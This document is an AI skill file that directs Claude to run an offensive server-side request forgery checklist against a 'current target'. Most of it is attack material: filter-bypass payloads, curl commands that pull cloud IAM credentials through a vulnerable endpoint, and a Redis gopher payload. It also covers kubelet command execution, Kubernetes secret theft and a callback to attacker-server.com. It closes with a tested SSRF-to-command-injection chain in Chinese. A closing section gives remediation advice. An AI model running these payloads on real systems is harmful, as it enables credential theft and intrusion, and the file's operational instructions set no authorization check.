---
name: offensive-ssrf
description: 'Server-Side Request Forgery testing checklist: SSRF discovery, blind
  SSRF with out-of-band, cloud metadata endpoints (AWS/GCP/Azure), SSRF filter bypass
  techniques (IP encoding, DNS rebinding, redirect chains), and SSRF to RCE escalation.
  Use for web app SSRF testing and bug bounty.'
---

# SKILL: Server-Side Request Forgery (SSRF)

## Metadata
- **Skill Name**: ssrf
- **Folder**: offensive-ssrf
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/ssrf.md

## Description
Server-Side Request Forgery testing checklist: SSRF discovery, blind SSRF with out-of-band, cloud metadata endpoints (AWS/GCP/Azure), SSRF filter bypass techniques (IP encoding, DNS rebinding, redirect chains), and SSRF to RCE escalation. Use for web app SSRF testing and bug bounty.

## Trigger Phrases
Use this skill when the conversation involves any of:
`SSRF, server-side request forgery, blind SSRF, cloud metadata, AWS metadata, GCP metadata, SSRF bypass, DNS rebinding, redirect chain, SSRF RCE, internal port scan`

## Instructions for Claude

When this skill is active:
1. Load and apply the full methodology below as your operational checklist
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target/context
4. Track which checklist items have been completed
5. Suggest next steps based on findings

---

## Full Methodology

# Server-Side Request Forgery (SSRF)

## Shortcut

- Spot the features prone to SSRF and take notes for future reference.
- Set up a callback listener to detect blind SSRF by using an online service, Netcat, or Burp's Collaborator feature.
- Provide the potentially vulnerable endpoints with common internal addresses or the address of your callback listener.
- Check if the server responds with information that confirms the SSRF. Or, in the case of a blind SSRF, check your server logs for requests from the target server.
- In the case of a blind SSRF, check if the server behavior differs when you request different hosts or ports.
- If SSRF protection is implemented, try to bypass it by using the strategies discussed in this chapter.
- Pick a tactic to escalate the SSRF.

```mermaid
flowchart LR
    A[Identify SSRF Vectors] --> B[Setup Callback Listener]
    B --> C[Test Internal Addresses]
    C --> D{Response Contains\nInternal Data?}
    D -->|Yes| E[Basic SSRF Confirmed]
    D -->|No| F[Check Callback\nListener Logs]
    F --> G{Callbacks\nReceived?}
    G -->|Yes| H[Blind SSRF Confirmed]
    G -->|No| I[Try Bypass Techniques]
    I --> J[Retest with Bypasses]
    E --> K[Escalate SSRF]
    H --> K
    J --> D
```

## Mechanisms

Server-Side Request Forgery (SSRF) is a vulnerability that allows attackers to induce a server-side application to make requests to an unintended location. In a successful SSRF attack, the attacker can force the server to connect to:

- Internal services within the organization's infrastructure
- External systems on the internet
- Services on the same server (localhost)
- Cloud service provider metadata endpoints

```mermaid
graph TD
    A[Attacker] -->|Sends crafted request| B[Vulnerable Web App]
    B -->|Makes request to| C[Unintended Target]
    C -->|Responds with data| B
    B -->|Includes response data| A

    subgraph "Possible Targets"
        C
        D[Internal Network Services]
        E[Cloud Metadata Service]
        F[External Web Services]
        G[Local Services on Same Server]
    end

    C --- D
    C --- E
    C --- F
    C --- G
```

Types of SSRF include:

- **Basic SSRF**: Direct requests to internal/external resources
- **Blind SSRF**: No response returned, but requests still occur
- **Semi-blind SSRF**: Limited information returned in responses
- **Time-based SSRF**: Detection through response timing differences
- **Out-of-band SSRF**: Secondary channel used for data exfiltration

## Hunt

### Identifying SSRF Vectors

- **URL Input Fields**:
  - Website preview generators
  - Document/image imports from URLs
  - API integrations with external services
  - Webhook configurations
  - Export to PDF/screenshot functionality

- **Proxy Functionality**:
  - Web proxies
  - Content fetchers
  - API gateways
  - Translation services

- **File Processing**:
  - Media conversion tools
  - Document processors
  - XML/JSON processors with external entity support

- **Integration Points**:
  - Third-party service connections
  - Cloud storage integrations
  - Monitoring systems
  - Webhook endpoints

```mermaid
mindmap
  root((SSRF Vectors))
    URL Input Fields
      Website Previews
      URL Imports
      API Integrations
      Webhooks
      PDF/Screenshot Export
    Proxy Functionality
      Web Proxies
      Content Fetchers
      API Gateways
      Translation Services
    File Processing
      Media Converters
      Document Processors
      XML/JSON Processors
    Integration Points
      Third-party Services
      Cloud Storage
      Monitoring Systems
      Webhook Endpoints
```

### Test Methodology

1. **Identify Parameters**: Find URL or hostname parameters
2. **Setup Listener**: Configure a system to detect callbacks
   - Public server with unique URL
   - Burp Collaborator
   - Tools like Interactsh or canarytokens.org
3. **Test Internal Access**: Try accessing internal resources
   ```
   http://localhost:port
   http://127.0.0.1:port
   http://0.0.0.0:port
   http://internal-service.local
   http://169.254.169.254/ (cloud metadata)
   ```
4. **Observe Responses**: Check for:
   - Response time differences
   - Error messages
   - Content leakage
   - Callbacks to your server

```mermaid
sequenceDiagram
    participant Attacker
    participant WebApp as Vulnerable Web App
    participant Internal as Internal Services
    participant CallbackServer as Attacker's Callback Server

    Note over Attacker,CallbackServer: Phase 1: Basic SSRF Testing

    Attacker->>WebApp: Request with Internal URL<br>(http://localhost:8080)
    WebApp->>Internal: Makes request to internal service
    Internal->>WebApp: Response from internal service
    WebApp->>Attacker: Leaked internal response

    Note over Attacker,CallbackServer: Phase 2: Blind SSRF Testing

    Attacker->>WebApp: Request with Callback URL<br>(http://attacker-server.com/unique-id)
    WebApp->>CallbackServer: Makes request to callback server
    CallbackServer->>Attacker: Log notification of request

    Note over Attacker,CallbackServer: Phase 3: Bypass Testing

    Attacker->>WebApp: Request with Obfuscated URL<br>(http://127.0.0.1.attacker.com)
    WebApp->>CallbackServer: Makes request due to parser confusion
    CallbackServer->>Attacker: Log notification of successful bypass
```

### Bypass Techniques Hunting

- Look for partial validation or URL parsing issues
- Test scheme changes (http→https, http→file)
- Try different IP formats (decimal, octal, hex)
- Use URL shorteners if allowed
- Check DNS rebinding possibilities

## Bypass Techniques

### Allowlist Bypasses

- **Open Redirects**: Using allowed domains with redirect parameters
  ```
  https://allowed-domain.com/redirect?url=http://internal-server
  ```
- **DNS Spoofing**: Register expired domains from allowlist
- **Subdomain Takeover**: Control subdomains of allowed domains
- **Path Traversal**: `https://allowed-domain.com@evil.com`

### Denylist Bypasses

- **Alternate IP Representations**:
  ```
  http://127.0.0.1/
  http://127.1/
  http://0177.0.0.1/
  http://0x7f.0.0.1/
  http://2130706433/ (decimal representation)
  ```
- **IPv6 Variations**:
  ```
  http://[::1]/
  http://[::127.0.0.1]/
  http://[0:0:0:0:0:ffff:127.0.0.1]/
  ```
- **Domain Resolutions**:
  ```
  http://localhost.evil.com/ (when attacker controls evil.com DNS)
  http://spoofed-domain/ (with modified /etc/hosts)
  ```
- **URL Encoding Tricks**:
  ```
  http://127.0.0.1/ → http://127%2e0%2e0%2e1/
  http://localhost/ → http://%6c%6f%63%61%6c%68%6f%73%74/
  ```
- **Non-Standard Ports**: Accessing standard services on non-standard ports
- **Case Manipulation**: `http://LoCaLhOsT/`
- **URL Schema Confusion**: `http:////localhost/`

```mermaid
flowchart TD
    A[SSRF Protection Bypass] --> B[Allowlist Bypass]
    A --> C[Denylist Bypass]

    B --> B1[Open Redirects]
    B --> B2[DNS Spoofing]
    B --> B3[Subdomain Takeover]
    B --> B4[Path Traversal]

    C --> C1[IP Representation Tricks]
    C1 --> C1a[Decimal: 2130706433]
    C1 --> C1b[Octal: 0177.0.0.1]
    C1 --> C1c[Hex: 0x7f.0.0.1]
    C1 --> C1d[Shortened: 127.1]

    C --> C2[IPv6 Variations]
    C2 --> C2a["[::1]"]
    C2 --> C2b["[::127.0.0.1]"]

    C --> C3[Domain Tricks]
    C3 --> C3a[localhost.evil.com]
    C3 --> C3b[spoofed-domain]

    C --> C4[Encoding Tricks]
    C4 --> C4a[URL Encoding]
    C4 --> C4b[Double Encoding]

    C --> C5[Schema Confusion]
    C5 --> C5a["http:////localhost"]

    style A fill:#f96,stroke:#333,stroke-width:2px,color:#333
    style B fill:#aae,stroke:#333,color:#333
    style C fill:#aae,stroke:#333,color:#333
```

### Uncommon Techniques

- **DNS Rebinding**: Change DNS resolution mid-connection
- **Temporal Intents**: Reliance on stale DNS resolution
- **Double URL Encoding**: Encode already encoded values
- **Unicode Normalization**: Using similar-looking characters
- **Protocol Downgrading**: Switching from https to http

### Additional Cloud Endpoints

- **Alibaba Cloud**: `http://100.100.100.200/latest/meta-data/`
- **Packet Cloud**: `https://metadata.packet.net/userdata`
- **ECS Task**: `http://169.254.170.2/v2/credentials/`
- **OpenStack**: `http://169.254.169.254/openstack/latest/meta_data.json`

### Other Bypass Methods

- **Weak Parser Exploits**:
  ```
  http://127.1.1.1:80\@127.2.2.2:80/
  http://127.1.1.1:80\@@127.2.2.2:80/
  http://127.1.1.1:80:\@@127.2.2.2:80/
  ```
- **Filter Bypass**:
  ```
  0://evil.com:80;http://google.com:80/
  ```
- **Enclosed Alphanumerics**: Using special Unicode characters that look like regular characters
  ```
  http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
  ```
- Host header abuse (`Host:` or `X-Forwarded-Host:`) against permissive back-end proxies
- Unicode homoglyph hostnames (e.g., ⅰⅱⅲ.local) to dodge simple regex checks
- DNS-over-HTTPS lookups (`https://dns.google/resolve?name=…`) to leak internal hostnames

### PDF SSRF Exploitation

When SSRF occurs in PDF rendering functionality, SVG can be used to exploit it:

```xml
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="highcharts-root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>
```

### Additional IP Representation Bypasses

```
http://%32%31%36%2e%35%38%2e%32%31%34%2e%32%32%37
http://%73%68%6d%69%6c%6f%6e%2e%63%6f%6d
http://0330.072.0326.0343
http://033016553343
http://0x0NaN0NaN
http://0xNaN.0xaN0NaN
http://0xNaN.0xNa0x0NaN
http://shmilon.0xNaN.undefined.undefined
http://NaN
http://0NaN
http://0NaN.0NaN
```

## Vulnerabilities

### Common SSRF Vulnerabilities

#### Cloud Metadata Access

- **AWS**: `http://169.254.169.254/latest/meta-data/` (IMDSv2 is now default; first acquire a session token with `PUT /latest/api/token` and include it in `X-aws-ec2-metadata-token`)

**AWS IMDSv2 Session Token Bypass Techniques:**

Many SSRF filters block `169.254.169.254` but miss the two-step IMDSv2 flow:

```python
# Step 1: Obtain session token (requires PUT request)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# If application supports PUT via SSRF parameter:
# Example 1: Via parameter that accepts methods
POST /api/fetch
{
  "url": "http://169.254.169.254/latest/api/token",
  "method": "PUT",
  "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
}

# Example 2: Via URL scheme that triggers PUT
http://vulnerable.com/proxy?url=http://169.254.169.254/latest/api/token&method=PUT

# Step 2: Use token to access metadata
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
X-aws-ec2-metadata-token: <TOKEN_FROM_STEP1>
```

**IMDSv2 Bypass Scenarios:**

1. Application supports custom HTTP methods in SSRF
2. Server-side HTTP client uses method from request parameter
3. HTTP parameter pollution (mixing GET with PUT semantics)
4. SSRF through applications that intentionally support PUT (webhooks, API gateways)
5. Vulnerable proxy servers that forward method override headers (`X-HTTP-Method-Override: PUT`)

- **Azure**: `http://169.254.169.254/metadata/instance` (requires header `Metadata: true` and `api-version`; alternate IP `http://168.63.129.16/metadata/instance`)
- **DigitalOcean**: `http://169.254.169.254/metadata/v1.json`
- **Equinix Metal**: `http://169.254.169.254/metadata` (legacy `metadata.packet.net` now redirects here)
- **Google Cloud**: `http://metadata.google.internal/computeMetadata/v1/`
- **Oracle Cloud**: `http://169.254.169.254/opc/v1/instance/`

#### Internal Service Exposure

- **Admin Interfaces**: `http://localhost:8080/admin`
- **Databases**: `http://localhost:3306`, `http://localhost:27017`
- **Caching Servers**: `http://localhost:6379` (Redis)
- **Management APIs**: `http://localhost:8500` (Consul)
- **Development Servers**: `http://localhost:3000`, `http://localhost:8000`

#### Protocol Abuse

- **File Protocol**: `file:///etc/passwd`
- **Dict Protocol**: `dict://localhost:6379/info`
- **Gopher Protocol**: `gopher://localhost:25/`
- **TFTP Protocol**: `tftp://localhost:69/`
- **LDAP Protocol**: `ldap://localhost:389/`
- **HTTP/2 Coalescing**: Re-used TLS connections between SAN-matched hostnames can bypass host-based filters
- **h2c Upgrade**: Clear-text HTTP/2 upgrade (`PRI * HTTP/2.0`) may slip past scheme filters
- **IPv6‑mapped IPv4**: `http://[::ffff:127.0.0.1]` and `http://[::ffff:7f00:1]`
- **Zone‑scoped IPv6**: `http://[fe80::1%25lo0]:80` may confuse naive validators

```mermaid
graph TB
    A[SSRF Vulnerability]
    A --> B[Cloud Metadata<br>Exploitation]
    A --> C[Internal Service<br>Access]
    A --> D[Protocol<br>Abuse]

    B --> B1["AWS: 169.254.169.254"]
    B --> B2["GCP: metadata.google.internal"]
    B --> B3["Azure: 169.254.169.254/metadata"]

    C --> C1["Admin: localhost:8080/admin"]
    C --> C2["DB: localhost:3306, 27017"]
    C --> C3["Cache: localhost:6379"]
    C --> C4["DevSrv: localhost:3000, 8000"]

    D --> D1["file:///etc/passwd"]
    D --> D2["dict://localhost:6379"]
    D --> D3["gopher://localhost:25"]
    D --> D4["ldap://localhost:389"]

    style A fill:#b7b,stroke:#333,stroke-width:2px,color:#333
    style B fill:#aae,stroke:#333,color:#333
    style C fill:#aae,stroke:#333,color:#333
    style D fill:#aae,stroke:#333,color:#333
```

### Common SSRF Parameters

```
url, dest, redirect, uri, path, continue, window, next, data, reference,
site, html, val, validate, domain, callback, return, page, feed, host,
port, to, out, view, dir, origin, source, endpoint, proxy, fetch, img_url
link, site_url, media_url
```

## Methodologies

### Tools

- **Burp Suite Extensions**:
  - Collaborator
  - SSRF Scanner
  - Param Miner
  - Turbo Intruder
- **Specialized SSRF Tools**:
  - SSRFmap
  - Gopherus
  - SSRF Sheriff
  - Interactsh
- **Network Utilities**:
  - Netcat
  - TCPDump
  - Wireshark
- **Payload Generators**:
  - PayloadsAllTheThings (SSRF section)
  - FuzzDB

### Testing Process

```mermaid
graph TD
    A[Start SSRF Testing] --> B[Initial Discovery]
    B --> B1[Map Entry Points]
    B --> B2[Setup OOB Detection]
    B --> B3[Test External URLs]
    B --> B4[Analyze Responses]

    B4 --> C{Potential SSRF?}
    C -->|Yes| D[Vulnerability Confirmation]
    C -->|No| E[Test Different Parameters]
    E --> B4

    D --> D1[Test Internal Resources]
    D --> D2[Test Blind SSRF]
    D --> D3[Test Protocol Support]

    D3 --> F{Vulnerability Confirmed?}
    F -->|Yes| G[Exploitation]
    F -->|No| H[Test Bypass Techniques]
    H --> D1

    G --> G1[Port Scanning]
    G --> G2[Cloud Metadata Access]
    G --> G3[Protocol-Specific Exploitation]
    G --> G4[File Access]

    G4 --> I[Documentation/Reporting]

    style A fill:#f9f,stroke:#333,stroke-width:2px,color:#333
    style C fill:#ff9,stroke:#333,stroke-width:2px,color:#333
    style F fill:#ff9,stroke:#333,stroke-width:2px,color:#333
    style I fill:#9f9,stroke:#333,stroke-width:2px,color:#333
```

#### Initial Discovery

1. Map all application entry points accepting URLs or file paths
2. Set up out-of-band detection server (e.g., Burp Collaborator)
3. Test with benign external URL (e.g., `https://your-server.com/ssrf-test`)
4. Analyze responses and check for callbacks

#### Vulnerability Confirmation

1. Test access to common internal resources:

   ```
   http://localhost/
   http://127.0.0.1:22/
   http://127.0.0.1:3306/
   http://169.254.169.254/
   ```

2. Test for blind SSRF using time delays:

   ```
   http://slowwly.robertomurray.co.uk/delay/5000/url/http://www.google.com
   ```

3. Confirm protocol support:
   ```
   file:///etc/passwd
   gopher://localhost:25/xHELO%20localhost
   ```

#### Exploitation

1. **Port Scanning**:

   ```
   for port in {1..65535}; do
     curl -s "https://target.com/api?url=http://localhost:$port" -o /dev/null
     if [ $? -eq 0 ]; then echo "Port $port is open"; fi
   done
   ```

2. **Cloud Metadata Access**:

   ```
   # AWS
    # IMDSv2 requires first fetching a token
    curl -s -X PUT "https://target.com/api?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
    # then include it
    curl -s "https://target.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE" -H "X-aws-ec2-metadata-token: TOKEN"
   # Then query the specific role
   curl -s "https://target.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"

   # GCP
   curl -s "https://target.com/api?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

    # Azure
    curl -s "https://target.com/api?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
   ```

3. **Gopher Protocol Exploitation** (Redis example):

   ```
   gopher://127.0.0.1:6379/_SET%20ssrfkey%20%22Hello%20SSRF%22%0D%0ACONFIG%20SET%20dir%20%2Ftmp%2F%0D%0ACONFIG%20SET%20dbfilename%20redis.dump%0D%0ASAVE%0D%0AQUIT
   ```

4. **File Access**:
   ```
   file:///etc/passwd
   file:///proc/self/environ
   file:///var/www/html/config.php
   ```

#### Bypass Testing

1. Test IP representation variations:

   ```
   http://127.0.0.1/
   http://2130706433/
   http://0x7f.0.0.1/
   http://017700000001/
   ```

2. Test with URL encoding:

   ```
   http://127.0.0.1/ → http://127%2e0%2e0%2e1/
   ```

3. Test with open redirects:

   ```
   https://allowed-domain.com/redirect?url=http://internal-server
   ```

4. Test DNS rebinding with modern tools:

**Modern DNS Rebinding Tools:**

- **1u.ms** - Online DNS rebinding service (successor to rebinder.net)
- **Singularity of Origin** - Advanced rebinding toolkit with GUI
- **rbndr.us** - Simple rebinding for pentesting (format: `make-<ip1>-<ip2>-rbndr.us`)
- **lockyfork/rebind** - Docker container for self-hosted rebinding server
- **DNSRebindToolkit** - Python-based customizable rebinding server

Example usage:

```bash
# Using rbndr.us: first resolves to your server, then to internal IP
curl http://make-1.2.3.4-127.0.0.1-rbndr.us

# Using 1u.ms
curl http://1u.ms/A-127.0.0.1:1-2  # Alternates between external and localhost
```

### Reporting

- Document the affected endpoint and parameters
- Provide clear proof of concept
- Explain potential impact (data access, internal recon, etc.)
- Suggest specific remediation for the vulnerability
- Include any bypass techniques that worked

## Escalate

- Perform Network Scanning to identify another vulnerable machine
- Pull Instance Metadata from cloud machines
- Kubernetes pivot: test common internal services from SSRF vantage point

### Kubernetes-Specific SSRF Attack Surface

#### Service Account Token Theft

```bash
# From SSRF vantage point:

# 1. Kubelet API (often unauthenticated or weakly authenticated)
curl http://127.0.0.1:10250/pods        # List all pods on node
curl http://127.0.0.1:10250/run/<namespace>/<pod>/<container> -d "cmd=id"  # Execute commands
curl http://127.0.0.1:10255/pods        # Read-only port (legacy, often still open)

# 2. Extract service account token
curl file:///var/run/secrets/kubernetes.io/serviceaccount/token
# Or via SSRF
http://vulnerable-app?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token

# 3. Use service account to access Kubernetes API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/api/v1/namespaces/default/pods

# 4. List secrets
curl -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

#### Service Mesh Metadata Exposure

**Istio/Envoy:**

```bash
# Envoy admin interface (often exposed on localhost)
http://127.0.0.1:15000/config_dump      # Full mesh configuration, certificates, endpoints
http://127.0.0.1:15000/clusters         # Upstream services and health
http://127.0.0.1:15000/stats            # Detailed metrics
http://127.0.0.1:15000/certs            # TLS certificates
http://127.0.0.1:15001/                 # Envoy admin on alternative port

# Pilot discovery service
http://127.0.0.1:8080/debug/endpointz   # Service endpoints
http://127.0.0.1:8080/debug/configz     # Pilot configuration
```

**Linkerd:**

```bash
# Linkerd proxy admin
http://127.0.0.1:4191/metrics           # Prometheus metrics (leaks service topology)
http://127.0.0.1:4191/ready             # Readiness endpoint
http://127.0.0.1:4140/                  # Inbound proxy admin
```

**Consul Connect:**

```bash
http://127.0.0.1:8500/v1/agent/self     # Agent configuration
http://127.0.0.1:8500/v1/catalog/services  # Service catalog
```

#### Container Runtime Socket Exposure

```bash
# Docker socket (if mounted - common in CI/CD containers)
# Via SSRF translate unix socket to HTTP
unix:///var/run/docker.sock

# Example: List containers
curl --unix-socket /var/run/docker.sock http://localhost/v1.40/containers/json

# Via SSRF (if application supports unix sockets):
http://vulnerable-app?url=unix:///var/run/docker.sock:/v1.40/containers/json

# containerd socket
unix:///run/containerd/containerd.sock

# CRI-O socket
unix:///var/run/crio/crio.sock
```

#### Container Metadata Services

```bash
# ECS Task Metadata Endpoint (AWS ECS/Fargate)
http://169.254.170.2/v2/metadata        # Task metadata
http://169.254.170.2/v2/credentials     # IAM credentials for task role
http://169.254.170.2/v2/stats           # Task stats
http://169.254.170.2/v3/                # v3 endpoint

# GCP Cloud Run metadata
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Requires header: Metadata-Flavor: Google

# Azure Container Instances
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires header: Metadata: true
```

#### Kubernetes Dashboard and Management Tools

```bash
# Kubernetes Dashboard (if exposed internally)
http://kubernetes-dashboard.kube-system.svc.cluster.local

# Prometheus
http://prometheus.monitoring.svc.cluster.local:9090/api/v1/query?query=up

# Grafana
http://grafana.monitoring.svc.cluster.local:3000

# ArgoCD
http://argocd-server.argocd.svc.cluster.local

# Rancher
http://rancher.cattle-system.svc.cluster.local
```

## Remediation Recommendations

### Input Validation

- Implement strict URL validation
- Use allowlists for domains and IP ranges
- Validate URL schemes/protocols
- Implement rate limiting
- Apply layered allow-lists: validate scheme → network range → domain, in that order

### Network Controls

- Segment internal networks
- Use egress filtering
- Implement proper firewall rules
- Disable unused URL schemes
- Block the IMDSv2 token-acquire path (`PUT /latest/api/token`) for workloads that do not need EC2 metadata
- Verify that SNI and the initial `Host` header match on every new TLS connection to mitigate HTTP/2 coalescing
- Terminate user-supplied fetches in a sandboxed egress proxy that enforces allow‑lists and IP range checks after DNS resolution
- Disallow redirects to private address space; re‑validate target after each redirect hop

### Application Design

- Use pre-signed URLs for cloud resources
- Implement proper access controls
- Use secure defaults for all URL handlers
- Implement request timeouts
- Strict, two‑stage URL validation using a trusted RFC‑3986 parser: validate scheme/host first, then resolve and validate IP/CIDR
- Prefer fetching by resource ID rather than arbitrary URL; where unavoidable, use signed callbacks (HMAC) and queue‑based fetchers

## Real-World Examples

### Case Studies

- Capital One Breach (2019)
  - Exploitation of metadata service
  - Impact: 100M+ customer records exposed
- Gitlab SSRF (2019)
  - Improper URL validation in import feature
  - Could access internal services
- Microsoft Purview SSRF (2025)
  - Misconfigured proxy endpoint allowed metadata-service access, leading to cross-tenant data exposure

### Common Attack Scenarios

- Cloud metadata access leading to credential theft
- Internal service enumeration through port scanning
- Redis unauthorized access via Gopher protocol
- Jenkins exploitation through internal access

## Framework-Specific SSRF

### Node.js

- Axios validation bypass techniques
- `http-proxy` misconfigurations
- `request` module vulnerabilities
- Axios path-relative URL bypass (CVE-2024-39338) — upgrade to ≥ 1.7.4

### Python

- `requests` library security considerations
- `urllib` parsing inconsistencies
- Flask/Django SSRF prevention

### Java

- `URLConnection` security practices
- Spring framework protections
- Apache HttpClient considerations
- Apache CXF Aegis databinding SSRF (CVE-2024-28752)


---

# 实测武器：SSRF → 内网服务 → 命令注入链（TSec 2026-08-03 a-14 实测）

## 链式利用

```bash
# ① 找 SSRF 入口（/api/import 的 target_endpoint 字段）
# ② 枚举内网管理端点（源码/文档/端口扫描）
# ③ SSRF 打到内网 admin-api 的命令注入参数
curl -sS -X POST "http://TGT/api/import" -H 'Content-Type: application/json' \
  -d '{"target_endpoint":"http://127.0.0.1:8000/admin-api/archive","filename":"x;cat /challenge/flag.txt;echo"}'
```

## 关键
- SSRF 的终点不一定是直接读文件——内网其他服务的命令注入/API 漏洞才是大杀器
- 先读源码确认内网服务拓扑，再决定 SSRF 打哪个端点
